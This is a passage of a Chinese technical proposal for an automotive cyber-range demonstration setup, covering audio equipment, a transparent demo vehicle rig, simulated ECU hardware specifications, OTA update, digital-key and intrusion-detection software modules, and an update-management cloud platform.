Pass），这些滤波器为用户提供了广泛的声音塑造能力。</li><li>延时功能：每路输入都能够提供最高2000毫秒的延迟，而每路输出能提供延迟50ms_x000b_，这项功能使得音频处理器在处理复杂的声音系统时能够实现精确的时间校正。</li><li>分频器：支持Butterworth，Bessel和Linkwitz-Riley等多种分频器类型，以及12、18、24分贝每倍频程的斜率选择，为用户提供了灵活的音频分频方案。</li><li>控制接口：音频处理器具备USB和以太网（RJ45）接口，用户可以通过这些接口将设备连接到PC或MAC上，进行详细的设置和实时监控，提高了设备的可操作性和监控便捷性。</li><li>操作系统兼容性：该设备支持Windows和Mac操作系统，这保证了无论用户的计算机系统是哪一种，都能够与音频处理器无缝配合。</li><li>场景预设：设备内存储了250组预设数据，用户可以根据不同的应用场景快速调用相应的预设设置，大大节省了调试时间。</li><li>电源适应性：该音频处理器支持220-240V AC电源输入，并且能够适应50/60Hz的电网频率，这使得它能够在全球大多数地区稳定运行。</li><li>产品品牌、型号详见产品概述</li></ol><h3 id="调音台"><a href="#调音台" class="headerlink" title="调音台"></a>调音台</h3><h4 id="产品概述-12"><a href="#产品概述-12" class="headerlink" title="产品概述"></a>产品概述</h4><p>调音台选用品牌为山东泰克，型号为C6N203，调音台是一种音频控制设备，用于混合、调整和处理多个音频信号源，包括麦克风、乐器和音乐播放器等，实现音量控制、均衡、效果处理等，以达到理想的音频混音和调音效果。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/de1ff7e48976c82868bc2d72b2a6f082.png"></p><h4 id="实施方案-12"><a href="#实施方案-12" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>马达推子配置：本调音台装备了33个精密马达推子，其中包括32通道的单独推子和1个主控推子，这些推子能够为用户提供即时的物理反馈，使混音操作更加直观和精确。</li><li>输入混音通道：拥有48条灵活的输入混音通道，包括40条单声道输入通道，2条立体声输入通道以及2条专用的返送通道，这些通道的丰富组合满足了从小型现场表演到大型音乐会的多样化需求。</li><li>辅助发送（AUX）与总线：提供20个AUX发送通道，其中8个为单声道，6个为立体声，再加上独立的立体声输出和子母线功能，这些发送通道和总线选项为复杂的音频路由提供了极大的灵活性。</li><li>DCA编组：调音台拥有8个DCA编组，每个编组都配备了Roll-out展开功能，这使得用户能夜通过编组控制多个通道，从而简化了大型混音环境中的管理和调整工作。</li><li>模拟输入：具备32个模拟XLR/TRS混合麦克风/线路输入，加上2个模拟RCA立体声线路输入，这些多功能的输入端口确保了调音台能够适应各种类型的音频源。</li><li>模拟输出：设有16个模拟XLR输出端口，为各种扩声和录制设备提供了高质量的音频信号输出。</li><li>数字录音/回放：内置34×34的USB2.0数字录音和回放接口，以及2×2的录音和回放功能，可通过USB存储设备进行操作，这提供了便捷的现场录音和后期制作流程。</li><li>扩展槽：调音台配备了1个扩展槽，支持NY64-D音频接口卡，使得用户可以根据需要扩展更多的输入/输出功能，增加调音台的多功能性和未来的升级能力。</li><li>产品品牌、型号详见产品概述</li></ol><h3 id="配套辅材"><a href="#配套辅材" class="headerlink" title="配套辅材"></a>配套辅材</h3><h4 id="产品概述-13"><a href="#产品概述-13" class="headerlink" title="产品概述"></a>产品概述</h4><p>靶场攻防演练大屏辅材为定制型产品，根据现场实施情况进行选取；</p><h4 id="实施方案-13"><a href="#实施方案-13" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li><p>外围屏体装饰材质：系统采用了优质的不锈钢或铝合金型材作为屏体四周的外装饰材料，这些材料不仅赋予了设备现代而优雅的外观，同时也提供了额外的结构稳固性和耐用性。这种精心挑选的材料能够承受日常使用中的磨损，保持设备的美观和完整性。</p></li><li><p>主控电缆和网络线材配备：为了确保您能够根据特定的设置需求进行无缝的设备连接，将根据实地测量的结果，提供充足长度的高品质主控电缆和网络线材。这些线材被精心设计以满足最高的传输标准，保障数据和电力传输的稳定性和效率。</p></li><li><p>系统支撑与附件：本套系统配备了多功能的固定支脚和滚轮，既可以保证设备的稳定放置，也可以在需要时轻松移动设备。同时，还提供了专业的风扇系统来确保设备在长时间运行中的散热，以及托盘和电源排插，以增强设备的功能性和使用便利性。</p></li><li><p>运输及现场调试安装服务：提供全方位的物流和技术支持服务，包括设备的安全运输、现场安装以及精确调试。专业团队将确保设备从收货到最终投入使用的每一个环节都能获得专业、细致、高效的服务，确保设备能够在使用时达到最佳性能。</p></li></ol><h1 id="智能汽车网络靶场攻防演练车辆台架"><a href="#智能汽车网络靶场攻防演练车辆台架" class="headerlink" title="智能汽车网络靶场攻防演练车辆台架"></a>智能汽车网络靶场攻防演练车辆台架</h1><h2 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h2><p>智能汽车网络靶场攻防演练车辆台架通过搭载在实车台架额零部件台架上的仿真智能电子电器零部件模拟汽车真实运行情况，配合靶场实现高逼真的实车攻防效果展示。</p><p>智能汽车网络靶场攻防演练车辆台架应包含实车台架、电子电器零部件、车端软件、仿真云平台。</p><h2 id="技术路线-5"><a href="#技术路线-5" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="实车台架方案"><a href="#实车台架方案" class="headerlink" title="实车台架方案"></a>实车台架方案</h3><h4 id="实施方案-14"><a href="#实施方案-14" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>定制的实车台架采用高品质亚克力材料制成的透明车模型，通过精细的喷绘工艺，车模型上醒目地展示了XXXX新能源的品牌标志。这种设计不仅展现了车辆的内部结构，同时通过品牌标识的展示，增强了企业形象的宣传效果。</li><li>整个实车台架的结构坚固，采用方管焊接打造金属龙骨，确保了台架的稳定性和耐用性。金属表面经过细致的打磨，以达到光滑的效果，并进行了防锈处理，以延长使用寿命。车身部分由亚克力热成型制作，车轮则是金属焊接加工，并且经过原子灰处理和打磨，表面喷涂有2K汽车漆，不仅美观大方，也增强了耐磨性。台架内部装配有LED流水灯条，并通过控制电路模拟真实车辆的管道走向，增添了技术感和未来感。</li><li>为了方便零部件的电源连接，实车台架提供了多个电源接口。这些接口的设计充分考虑了用户操作的便捷性，确保了各个零部件能够轻松地接入电源，并进行稳定的电力供应。</li><li>实车台架支持安装光电装置，这些装置用于实时展示车内数据流量和潜在的攻击流量。用户可以根据需要配置这些光电装置的开关，以达到最佳的展示效果，同时也方便了演示过程中的数据监控。</li><li>与数字钥匙技术相结合，实车台架支持在车内通过用户界面(UI)展示车门的开关状态。这种交云互动的展示方式不仅增加了用户体验，也直观地展现了智能车辆技术的便捷性。</li><li>实车台架中的TBOX、车机主机、仪表主机以及网关等关键部件均提供了暴露的调试接口，方便技术人员进行程序的调试和数据的监测，确保系统的稳定运行和维护的便捷性。</li><li>车内的电子电器零部件主要采用仿真件进行挂载，同时保留了原零部件，这样不仅能够完整地展示车辆的电子系统，而且确保了车内12V电源系统能够正常运行，满足各种演示和测试的需求。</li><li>攻击效果与车联网安全运营中心联动，在发生安全攻击时，实车台架能够将检测到的攻击信息实时传输至运营中心，并在攻防演示的大屏上直观地展示响应和攻击检测结果，这不仅增强了演示的互动性和观赏性，也提升了安全教育的实效性。</li></ol><h4 id="技术实现内容-7"><a href="#技术实现内容-7" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>实车台架是一种用于展示和测试车辆的特殊设备，车模型具有一个亚克力透明车身，使观察者可以清晰地看到车辆内部的结构和工作原理。</p><p>实车台架是用于展示和演示车辆相关技术和功能的装置，为了满足展示需求并提供良好的用户体验，要设计了一套实车台架方案。该方案采用亚克力透明车模型，配备全车金属龙骨结构和亚克力热成型车身，具备防锈处理和外观喷涂等特点。此外，方案支持各种功能和参数要求，包括光电装置、数字钥匙展示、接口配置等。</p><p>亚克力透明车身是由高透明度的亚克力材料制成，它具有优异的光学性能，可以提供清晰的视野。这种车身材料不仅具有良好的耐用性和抗冲击性，还能够有效地防止紫外线和其他外部因素对车辆内部的影响。</p><p>实车台架的亚克力透明车身为观察者提供了独特的视角，使他们能够直观地了解车辆的内部构造和各个部件的工作原理。观察者可以清楚地看到发动机、传动系统、悬挂装置、制动系统等关键部件的工作状态和相互之间的配合。</p><p>通过实车台架，观察者可以更好地理解车辆的工作原理和性能特点。他们可以观察到发动机的燃烧过程、传动系统的工作方式、悬挂装置的运动轨迹等。这对于学习和教育、技术以及产品展示都具有重要意义。</p><p>实车台架的亚克力透明车身可以用于测试和调试车辆。通过观察车辆内部的运动和相互作用，工程师和技术人员可以更准确地识别和解决问题，提高车辆的性能和可靠性。</p><p>本方案采用的亚克力实车台架车体采用方管焊接金属龙骨，整体打磨光滑，做防锈处理，车身亚克力热成型制作，车轮金属焊接加工，整体批原子灰打磨光滑，外观喷涂2K汽车漆，内部LED流水灯条控制电路模拟管道走向，将TBOX、车机主机、仪表主机、网关等关键部位暴露调试接口，配合演示场景可进行光电效果展示，攻击行为联动车联网安全运营中心，并在攻防演示大屏上展示响应攻击检测。</p><p>实车台架主要包括以下内容：</p><p>实车台架采用亚克力透明车模型，喷绘XXXX新能源标志，具有高透明度和良好的展示效果。</p><p>全车采用方管焊接金属龙骨，经过整体打磨光滑处理，并进行防锈处理，确保结构牢固和使用寿命。</p><p>车身采用亚克力热成型制作，具备坚固、透明的特点，能够清晰显示车内部分结构和零部件。</p><p>车轮采用金属焊接加工，整体批原子灰打磨光滑，外观喷涂2K汽车漆，提供细腻的表面质感和真实感。</p><p>内部配置LED流水灯条控制电路模拟管道走向，能够展示车辆内部数据流量和攻击流量，具备良好的视觉效果。</p><p>提供零部件电源接口，方便连接和供电各种电子零部件，确保其正常运行。</p><p>支持设置光电装置，用于展示车内数据流量和攻击流量，并可根据需求配置开关，方便进行展示和演示。</p><p>支持配合数字钥匙在车内通过UI展示车门开关状态，能够直观地展示车辆的安全功能。</p><p>TBOX、车机主机、仪表主机、网关暴露调试接口，方便连接和调试相关设备，确保其正常运行。</p><p>车内电子电器零部件采用仿真件挂载，同时保留原零部件，确保车内12V系统能够正常运行。</p><p>攻击效果能够联动车联网安全运营中心，并在攻防演示大屏上展示响应攻击检测的结果，提供真实的演示效果。</p><h3 id="电子电器零部件方案"><a href="#电子电器零部件方案" class="headerlink" title="电子电器零部件方案"></a>电子电器零部件方案</h3><h4 id="实施方案-15"><a href="#实施方案-15" class="headerlink" title="实施方案"></a>实施方案</h4><ol><li>电子电器零部件产品线支持市场上主流的仿真车零部件，包括车机、TBOX、网关和仪表等关键部分。这些仿真零部件在设计和功能上与真实车辆的零部件相似，能够为客户提供真实的体验，非常适合在研发和教育中使用。</li><li>在总线协议方面，支持CAN2.0总线标准，能够以500k/s的速率进行通信，同时支持CAN和车载以太网报文的模拟发送和解析功能。此外，产品还支持CAN FD技术的升级扩展，以适应未来更高速率和更大数据量的通信需求。</li><li>车机部分的配置非常强大，支持的MCU处理器速度达到168MHz，配备高达192KB的RAM和1M的Flash存储。同时，车机也支持单核Cortex A7 MPU的处理器，配备了512M的RAM和8G的ROM，并支持32G的扩展。高分辨率的800x480触控屏幕满足了复杂的业务系统人机交互需求。在通信方面，车机提供2路CAN和2路100M ETH接口，并且具备UDS诊断、电源管理和CAN报文处理等功能。MCU和MPU均支持远程升级，MPU还支持A/B分区升级以及升级MCU的功能。</li><li>TBOX支持通过4G或有线方式连接外部网络，并具备自动管理连接和断网自动重连的功能。其MPU配置为单核Cortex A7级别，配备了512M RAM和8GROM，支持32GSD卡扩展的Linux系统。MCU的主频168MHz，RAM达到192KB，Flash为1M大小。TBOX还提供1路CAN和2路100M以太网通信接口，并实现了ECU的基础功能，如UDS诊断、电源管理和CAN报文处理等。MCU和MPU均支持远程升级，MPU还支持A/B分区升级以及升级MCU的功能。</li><li>网关的MCU配置同样强大，主频为168MHz，RAM为192KB，Flash为1M。它支持报文及信号的路由功能，同时具备诊断防火墙功能，以确保系统的安全性。网关还实现了ECU的基础功能，如UDS诊断、电源管理和CAN报文处理等，并且MCU支持UDS远程升级，MPU支持A/B分区升级，以及MPU升级MCU的功能。</li><li>仪表的MCU配置要求高效，主频达到168MHz，RAM达到192KB，Flash达到1M。MPU方面，配备了单核Cortex A7处理器，配备了512M RAM和8G ROM，并支持32GSD卡扩展的Linux系统。仪表配备了7寸800x480分辨率屏幕，可以显示车辆的实时状态信息，如车速、档位、门窗状态和故障状态等。仪表还实现了ECU的基础功能，如UDS诊断、电源管理和CAN报文处理等，并支持MCU的UDS远程升级和MPU的A/B分区升级，以及MPU升级MCU的功能。</li><li>数字钥匙的MCU配置要求为主频为48MHz，RAM为20KB，Flash为35KB。它支持蓝牙连接，覆盖距离在20米以上。被动进入区域范围为0到3米，确保车内空间（包括驾驶员和副驾驶区域）的覆盖率达到90%以上，同时车外溢出控制在20厘米以内。自动解锁和远离上锁的距离以及迎宾区域识别都是可调的，提供更加灵活的使用体验。</li><li>电子电器零部件支持与仿真云平台的通信，这为攻防演示提供了必要的测试环境。仿真云平台能够模拟真实的网络环境，让用户能够在一个安全的环境中测试和演练各种网络安全方案。</li><li>此外，还支持扩展远程诊断等智能网联业务功能。这些功能的扩展为车辆提供了更多智能化的服务，提高了车辆的智能水平和用户的使用便捷性，为车辆的未来智能网联发展奠定了坚实的基础。</li></ol><h4 id="技术实现内容-8"><a href="#技术实现内容-8" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>电子电器零部件虚拟化技术是一种将实际的电子电器零部件通过虚拟化技术模拟和仿真的方法。它可以在计算机系统中创建虚拟的电子电路和设备，以实现对电子电器系统的模拟和测试。</p><p>电子电器零部件虚拟化技术的主要目的是提供一种便捷、高效和经济的方法，用于设计、开发和测试电子电器系统。通过虚拟化技术，可以在计算机环境中快速搭建和模拟电路，并进行各种测试和分析，而无需实际的硬件零部件。</p><p>这项技术的核心是建立虚拟的电子电器模型，包括各种电子元件、电路板、传感器、执行器等。这些虚拟模型可以在计算机系统中进行仿真和测试，以验证设计的正确性、性能和可靠性。</p><p>1. 概述</p><p>本技术方案旨在设计一套智能网联车辆仿真台架系统，该系统将集成主流的仿真车零部件，支持高级通信协议和数据处理功能，以实现复杂的车辆通信和智能网联业务仿真。</p><p>2. 主要零部件支持</p><p>车机: 采用高性能MCU处理器和Cortex A7 MPU，实现复杂的数据处理和人机交互。</p><p>TBOX: 提供网络连接和车辆数据管理功能，支持4G和有线网络。</p><p>网关: 实现车辆内部通信的中转和安全管理。</p><p>仪表: 显示车辆实时状态和各类驾驶信息。</p><p>数字钥匙: 实现无钥匙进入和启动功能，支持蓝牙连接。</p><p>3. 总线协议</p><p>支持CAN2.0总线，速率500k/s，实现CAN、车载以太网报文的模拟发送和解析。</p><p>支持CAN FD协议，为未来的升级和扩展提供可能。</p><p>4. 详细零部件参数</p><p>车机:</p><p>MCU处理器168MHz及以上，RAM 192KB，Flash 1M。</p><p>单核Cortex A7 MPU，512M RAM，8G ROM，支持32G SD卡扩展。</p><p>800x480分辨率触控屏，满足人机交互需求。</p><p>2路CAN，2路100M ETH通信接口。</p><p>支持UDS诊断、电源管理、CAN报文处理等功能。</p><p>支持远程升级MCU，支持远程升级MPU。</p><p>TBOX:</p><p>MPU单核Cortex A7，512M RAM，8G ROM，支持32G以上SD卡扩展，运行Linux系统。</p><p>MCU主频168MHz，RAM 192KB，Flash 1M。</p><p>1路CAN，2路100M以太网通信接口。</p><p>实现ECU基础功能，支持UDS远程升级和MPU升级MCU。</p><p>网关:</p><p>MCU主频168MHz，RAM192KB，Flash1M。</p><p>支持报文及信号路由，诊断防火墙功能。</p><p>实现ECU基础功能，支持远程升级。</p><p>仪表:</p><p>MCU主频168MHz，RAM 192KB，Flash 1M。</p><p>MPU单核Cortex A7，512M RAM，8G ROM，支持32G SD卡扩展，运行Linux系统。</p><p>7寸800x480或更高分辨率屏幕，显示车辆状态信息。</p><p>实现ECU基础功能，支持远程升级。</p><p>数字钥匙:</p><p>MCU主频 48MHz，RAM20KB，Flash 35KB。</p><p>蓝牙连接距离20m，被动进入区域0～3m。</p><p>车内空间覆盖率90%，车外溢出＜20cm。</p><p>自动解锁和远离上锁距离可调，迎宾区域识别可调。</p><p>5. 仿真云平台通信</p><p>系统将支持与仿真云平台的通信，为攻防演示和测试提供环境。</p><p>6. 智能网联业务功能扩展</p><p>系统将支持扩展远程诊断等智能网联业务功能，以适应未来车辆通信和服务的发展。</p><p>7. 技术路线图</p><p>完成基础车辆通信和ECU功能的仿真。</p><p>实现与仿真云平台的通信，进行攻防演示。</p><p>扩展智能网联业务功能，提供远程诊断和其他高级服务。</p><p>电子电器零部件虚拟化技术具有以下优势：</p><p>节省成本：通过虚拟化技术，可以减少对实际硬件的需求，从而降低开发和测试的成本。不再需要大量的物理硬件进行测试和验证，而是通过虚拟模型进行仿真，节省了成本和资源。</p><p>提高效率：虚拟化技术可以快速创建和修改电子电器系统的模型，在计算机环境中进行仿真和测试。这大大缩短了设计和开发周期，提高了工作效率。</p><p>灵活性和可重复性：虚拟化技术可以轻松地修改和调整电子电器系统的参数和配置，以满足不同的需求和场景。同时，虚拟模型可以保存和复制，实现对设计和测试过程的可重复使用。</p><p>风险管理：通过虚拟化技术，在实际制造之前，可以对电子电器系统进行全面的仿真和测试，以发现潜在的问题和风险。这有助于提前识别和解决问题，降低产品开发和生产的风险。</p><p>总的来说，电子电器零部件虚拟化技术为电子电器系统的设计、开发和测试提供了一种高效、灵活和经济的方法。它可以加快产品上市时间，降低开发成本，并提高产品的可靠性和性能。</p><h3 id="车端软件方案"><a href="#车端软件方案" class="headerlink" title="车端软件方案"></a>车端软件方案</h3><h4 id="实施方案-16"><a href="#实施方案-16" class="headerlink" title="实施方案"></a>实施方案</h4><p>远程升级模块如下：</p><ol><li><p>车端软件远程升级模块的核心功能之一是支持升级包下载存储管理。这项功能要求模块能够安全高效地下载最新的升级包，并将其存储在车辆的内部存储器中。在整个过程中，模块必须确保下载的数据不受损坏，且在存储和传输过程中具有防篡改的能力，以保证升级的可靠性和数据的完整性。</p></li><li><p>对于支持升级流程执行，模块必须能够细致地控制车内每一个电子控制单元（ECU）的升级过程。这包括升级前的准备工作、升级过程中的各项任务执行，以及升级后的验证工作。模块应当具备灵活性以适应不同ECU的特定要求，并确保整个升级过程顺畅无误，以避免对车辆功能的任何不利影响。</p></li><li><p>在安全性方面，支持升级包解密和验签工作。升级模块必须能够对接收到的每个升级包进行解密，并通过验签来确认升级包的真实性和完整性。这一步骤对于防止恶意软件注入至关重要，确保了升级包在制造商到车辆这一传输链的每一个环节都是安全可信的。</p></li><li><p>支持升级包反差分工作是优化数据传输和升级效率的关键。通过这项技术，升级模块可以只下载与旧版本不同的数据部分，而不是整个软件包。这种方法显著减少了所需传输的数据量，尤其在网络连接有限的环境下，可以大幅提高升级效率和节省带宽资源。</p></li><li><p>支持升级状态日志的记录与上报功能对于维护和监控升级过程。升级模块应能够详细记录升级过程中的每个步骤和状态变化，并在需要时将日志信息上报给制造商或服务提供商。这不仅有助于即时发现和解决升级过程中可能出现的问题，而且对于长期的维护和优化升级策略提供了数据支持。</p><p>数字钥匙模块如下：</p></li><li><p>车端软件数字钥匙方案的设计兼容多种通信协议，包括国际汽车电子标准的ICCE（In-Car Communication Encryption）协议和专为特定应用设计的私有协议。这种多协议支持确保了数字钥匙系统的广泛适用性和灵活性，允许它与各种不同的智能设备无缝对接，为用户提供更加便捷的使用体验。</p></li><li><p>数字钥匙方案提供基于蓝牙信号强度指示（RSSI）的定位技术。这项技术应支持单模块和多模块定位，使得系统能够准确判断数字钥匙相对于车辆的位置。这种定位技术可以提高车辆的防盗性能。</p></li><li><p>提供近场安全通信能力，近场安全通信能力对于数字钥匙系统来说至关重要。这种通信能力能够确保在钥匙与车辆之间的数据交换过程中，所有的通信内容都是加密的，从而保护用户的隐私和安全。这也意味着即使在拥挤的环境中，数字钥匙的信号也不容易被截获或者伪造。</p></li><li><p>数字钥匙的软件设计应当独立于底层硬件平台，这样可以在不同的车型和硬件配置上快速部署。这种设计理念使得数字钥匙方案具有很高的可移植性，能够无缝集成到各种车辆系统中，降低开发和维护的复杂性，加速新车型的上市进程。</p></li><li><p>整体方案的性能优化是数字钥匙系统设计的另一关键点。系统需要在保持高性能的同时，尽量减少对车辆系统资源的开销，包括电池消耗、计算能力和存储空间。这样的设计可以确保数字钥匙系统即使在长时间运行后，也不会对车辆的其他功能造成影响。</p></li><li><p>数字钥匙方案的开发应基于ASPICE（Automotive Software Process Improvement and Capability Determination）流程体系，遵循这一体系可以确保软件开发过程的规范性，从而提高产品的可靠性和稳定性。特别是在蓝牙连接方面，一个稳定的连接是确保用户体验和系统安全的基础。</p></li><li><p>车端集成认证管理、钥匙管理、定位计算、蓝牙安全通信、密码模块、安全芯片和天线模块七大功能实施方案如下：</p></li><li><p>认证管理在车端软件中必须能够提供基于不同数字钥匙协议的认证服务，无论用户所使用的数字钥匙遵循哪种标准或协议，车端软件都能够识别并进行正确的身份验证。这包括执行协议要求的认证过程，以确保只有合法的用户可以访问车辆。</p></li><li><p>钥匙管理的职责是确保数字钥匙从发行到废止的全生命周期得到妥善管理。车端软件能够处理钥匙的创建、分配、激活、使用、更新和撤销等各个阶段，并保证这些操作符合所遵循的数字钥匙协议的安全要求。此外，软件能够适应不同协议的更新，确保与最新的安全标准兼容。</p></li><li><p>定位计算要求车端软件具备高精度的定位能力，通过BLE技术实现精确的空间定位。提高钥匙认证的成功率，而且对于实现如无钥匙进入等高级功能是不可或缺的。</p></li><li><p>蓝牙安全通信：车端软件不仅支持不同数字钥匙协议的蓝牙配对、绑定和连接功能，还要支持应用层加密。确保即使在公开的蓝牙环境中，数据传输也能维持高度的安全性。同时，软件还需根据定位计算的需求优化蓝牙配置，以保证定位精度。</p></li><li><p>密码模块：支持车端软件具备全面的安全功能，包括安全存储、密码服务和密钥管理。确保所有敏感信息都被妥善保护，能够抵御外部攻击和内部威胁。车端软件的密码模块采用最新的加密算法。</p></li><li><p>天线模块：在车端软件中的实现的基于BLE技术的定位服务在硬件层面依赖于精密的天线模块，并且需要能够根据不同的数字钥匙协议进行相应的配置，实现对不同协议的兼容。在各种环境下都能提供准确的定位数据。</p><p>入侵检测模块如下：</p></li><li><p>入侵检测模块具备全面的监控能力，能够监测并保护网络、主机以及车辆的关键通信接口、CAN总线网络。这包括实时分析传输数据的行为，识别潜在的恶意行为或异常模式，并立即采取防御措施。该模块应能够与车辆的其他安全系统协同工作，形成一个多层次的安全防护网，确保车辆的网络安全性。</p></li><li><p>当入侵检测系统（IDPS）侦测到任何异常行为或安全事件时，它能够迅速通过车辆的主节点将这些信息转发至安全运营中心（SOC）。这一过程应保证信息的及时性和准确性，以便SOC能够有效地接收并处理这些安全警报。</p></li><li><p>安全运营中心（SOC）对接收到的安全事件进行深入分析，并在界面中以直观的方式呈现。SOC会结合当前的漏洞信息和威胁情报来评估事件的严重性，并决定是否需要更新安全策略。如果确定需要更新，支持SOC的运营管理部门将负责在规则管理系统中配置新的安全策略，以提高车辆系统的抵抗力。</p></li><li><p>IDPS管理模块需要定期与SOC进行通信，以确保所有的安全规则都是最新的。该管理模块会轮询SOC，拉取最新更新的安全规则，并将这些规则分发到车辆系统中的每一个IDPS感知节点。这样可以保证车辆的安全防护措施能够及时更新，应对新出现的安全威胁和漏洞。</p></li></ol><h4 id="技术实现内容-9"><a href="#技术实现内容-9" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>车端软件是指安装在车辆内部电子系统中的软件，它扮演着管理和控制车辆各种功能的重要角色。本方案的车端软件包含以下几个关键功能：OTA升级、蓝牙钥匙和IDPS入侵检测。</p><p>OTA（Over-The-Air）升级是车端软件的一项重要功能。它允许车辆制造商通过无线网络远程更新和升级车辆的软件系统。这种升级方式可以使车辆保持最新的功能和性能，同时修复潜在的安全漏洞和软件缺陷。OTA升级还能够为车辆提供新的功能和服务，提升用户体验，而无需将车辆带到维修中心进行升级；</p><p>蓝牙钥匙是一种通过蓝牙技术实现的无线钥匙系统。车辆的车端软件可以与用户的智能手机或其他蓝牙设备进行通信，将智能手机作为车辆的钥匙使用。用户可以使用手机上的特定应用程序与车辆进行配对和控制，例如远程解锁、启动发动机、调整座椅和温度等。蓝牙钥匙提供了便捷和安全的车辆访问方式，消除了传统钥匙的使用需求。</p><p>IDPS（Intrusion Detection and Prevention System）入侵检测是车辆安全性的重要组成部分。车端软件可以集成IDPS功能，用于监测和识别车辆系统中的潜在入侵行为。它可以检测到未经授权的访问、恶意软件、数据篡改等安全威胁，并采取相应的防御措施，例如发出警报、阻止入侵行为或自动修复受影响的系统。IDPS入侵检测可以提高车辆的安全性和防护能力，保护车辆和乘客的隐私和安全。</p><p>1. 远程升级模块</p><p>远程升级模块的设计与实现将包含以下关键功能：</p><p>升级包下载存储管理：安全地管理升级包的下载、存储和分发，确保数据完整性和一致性。</p><p>升级流程执行：执行详细的升级流程，包括版本检查、升级准备、升级执行和升级后清理等步骤。</p><p>升级包解密和验签：确保升级包的来源可靠、内容未被篡改，使用先进的加密算法和数字签名技术。</p><p>升级包反差分工作：支持差分升级，减少数据传输量，提高升级效率。</p><p>升级状态日志记录与上报：详细记录升级过程中的各种状态和事件，并将重要信息上报至后端服务。</p><p>2. 数字钥匙模块</p><p>数字钥匙模块将实现以下功能：</p><p>多协议支持：支持ICCE及私有协议，确保广泛的兼容性和灵活性。</p><p>基于蓝牙RSSI的定位技术：单模块及多模块定位，提供精确的车辆与用户定位功能。</p><p>近场安全通信能力：确保用户与车辆间的通信安全。</p><p>底层硬件平台独立：软件设计不依赖于特定的硬件平台，以便快速部署至不同车型。</p><p>系统资源开销小：优化整体方案性能，减少系统资源消耗。</p><p>基于ASPICE流程体系开发：确保软件开发过程的可靠性和稳定性。</p><p>3. 车端集成功能</p><p>车端软件将集成以下七大功能：</p><p>认证管理：提供基于不同数字钥匙协议的认证服务，确保身份验证的安全性。</p><p>钥匙管理：全生命周期的钥匙管理服务，支持不同数字钥匙协议的具体应用。</p><p>定位计算：基于BLE的高精度定位计算，提供精确的用户和车辆位置信息。</p><p>蓝牙安全通信：实现蓝牙配对绑定、连接功能和应用层加密，确保通信安全。</p><p>密码模块：包括安全存储、密码服务、密钥管理等安全功能。</p><p>安全芯片：增强安全性，提供硬件级别的保护。</p><p>天线模块：根据不同协议实现，提供BLE定位服务。</p><p>4. 入侵检测模块</p><p>入侵检测模块将提供以下关键功能：</p><p>网络、主机、CAN总线入侵检测及防御：监控车辆内部网络，防止未授权访问和攻击。</p><p>安全事件上报：将检测到的安全事件通过主节点转发至安全运营中心（SOC）。</p><p>事件分析和策略更新：SOC对事件进行分析并决定是否更新策略，新策略将在SOC运营管理中配置。</p><p>IDPS管理模块：轮询SOC，拉取更新的安全规则，并转发至各个IDPS感知节点。</p><h3 id="仿真云平台方案"><a href="#仿真云平台方案" class="headerlink" title="仿真云平台方案"></a>仿真云平台方案</h3><h4 id="实施方案-17"><a href="#实施方案-17" class="headerlink" title="实施方案"></a>实施方案</h4><p>远程升级平台，详见“智能汽车网络靶场演示模块”章节，“OTA远程升级攻防演示模块”部分。</p><ol><li>为了更好地控制零件升级的过程和确保车辆的安全性，平台支持零件管理功能，按照ECU类型分类管理，包括建立零件列表、版本管理、升级计划、安全检测、升级日志和用户界面等功能平台支持车辆、车型管理功能，车辆绑定车型，车型关联ECU信息。可以在平台查看每辆车的所有ECU详细软硬件信息。</li><li>平台支持车辆的注册、录入、维护、查询、删除等操作，在车辆注册时，需要输入车辆的基本信息，例如车牌号、VIN码、品牌、型号等，在车辆录入后，可以在平台上查看每辆车的所有ECU详细软硬件信息。平台支持车型的管理，包括车型注册、录入、维护、查询、删除等操作。在车型注册时，需要输入车型的基本信息，例如车型名称、品牌、型号等，同时，还需要关联该车型所对应的ECU信息。平台支持车辆与车型之间的绑定关系，即每辆车都应该对应一个特定的车型，通过车辆与车型的绑定，可以更加精确地管理车辆软件升级过程。平台支持车型与ECU信息的关联，即每种车型都应该对应一组特定的ECU信息。在车型注册时，需要关联该车型所对应的ECU信息，包括ECU类型、型号、版本号等基本信息，通过车型与ECU信息的关联，可以更加精确地管理车辆软件升级过程。平台应提供查询车辆软硬件信息的功能，包括车辆基本信息、车型信息和ECU信息等，通过查询车辆软硬件信息，可以更好地进行车辆软件升级和管理。</li><li>平台应支持ECU软件版本管理功能。每个软件包只能唯一关联到一个ECU，并确保每个ECU的软件版本号唯一。平台应支持ECU软件包的注册、上传、维护和删除操作，同时提供对软件版本号的唯一性管理。通过建立软件包和ECU之间的关联关系，平台可以实现精确的软件升级。</li><li>平台支持升级包管理功能。用户可以上传ECU各部分软件，包括MCU升级包、MPU升级包以及配置文件等，并通过平台对这些软件进行打包、签名和加密等操作，最终生成ECU的升级文件。这样的功能扩展使得平台能够更好地管理和处理用户上传的软件，确保其安全性和准确性，并为ECU的升级过程提供可靠的支持。</li><li>平台支持差分功能，差分功能可以通过对软件版本进行差分处理，减少生成的最终升级文件大小。通过这样的处理方式，平台可以更好地节约存储空间和网络带宽，提高升级效率和速度，并降低用户使用成本。</li><li>平台支持升级策略管理。通过升级策略限定每次升级的范围（如：单辆车、小批量、所有车辆等）达到灰度升级的目的。</li><li>平台支持升级任务管理的功能，该功能包括升级任务的创建、审核、取消以及执行状态的监控等多项功能。用户可以通过平台创建新的升级任务，并在需要时对任务进行审核或取消操作。同时，平台还提供了升级任务执行状态的监控功能，用户可以实时查看任务的执行进度和结果。这样的功能扩展使得平台能够更好地管理和控制升级任务的整个生命周期，提高任务的可控性和效率，确保升级过程的稳定性和准确性。</li><li>平台支持日志管理的功能，该功能可以对车辆上传的升级日志信息进行存储、分析和处理。平台可以将所有的升级日志信息进行记录和存储，并提供相应的查询和检索功能，以便用户随时查看和分析。同时，平台还可以对这些日志信息进行统计和分析，进一步优化升级过程，提高升级效率和质量。</li><li>平台支持大数据分析的功能，该功能可以对后台收集和产生的信息进行分析和呈现。其中包括对车辆总数进行统计，